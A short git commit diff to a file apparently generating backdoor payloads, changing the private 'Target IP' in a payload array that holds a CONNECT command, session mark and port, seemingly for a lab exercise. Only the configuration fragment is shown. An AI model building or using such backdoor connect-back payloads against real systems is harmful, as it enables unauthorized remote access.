5ab6c6366bb5fda4622c2fdfd69dc504f07955b3
thra5os <thguerbet@gmail.com>
2025-01-24 12:02:23 +0100

    changed ip target

--- bd_payload_generator.php
+++ bd_payload_generator.php
@@ -13,7 +13,7 @@ $en = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
 $payload = [
     2 => "CONNECT", // CMD
     3 => "mark123",  // MARK (unique identifier for session)
-    6 => "192.168.45.139", // Target IP (for CONNECT case)
+    6 => "192.168.45.205", // Target IP (for CONNECT case)
     7 => "12345",      // Port (for CONNECT case)
 ];
 print_r($payload);
